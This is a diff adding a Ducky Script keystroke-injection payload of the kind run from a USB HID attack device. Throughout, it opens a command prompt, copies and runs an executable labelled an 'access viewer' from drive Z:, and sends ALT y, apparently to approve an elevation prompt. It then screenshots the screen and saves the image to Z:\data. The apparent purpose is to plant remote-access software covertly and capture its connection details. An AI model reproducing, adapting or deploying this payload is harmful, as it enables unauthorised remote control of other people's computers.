@@ -1,0 +1,39 @@
+DEFAULTDELAY 100
+DELAY 5000
+GUI r
+DELAY 50
+STRING cmd
+ENTER
+DELAY 250
+STRING cd Downloads
+ENTER
+
+REM copy of access viewer
+STRING copy Z:\agent6.10.exe 
+ENTER
+STRING agent6.10.exe & exit
+ENTER
+
+DELAY 1000
+ALT y
+DELAY 2000
+
+REM save information
+PRINTSCREEN
+GUI r
+STRING mspaint
+ENTER
+DELAY 1000
+
+CTRL v
+ALT 1
+DELAY 1000
+F4
+CTRL a
+REM access viewer location
+STRING Z:\data
+ENTER
+DELAY 50
+ALT s
+ALT F4
+
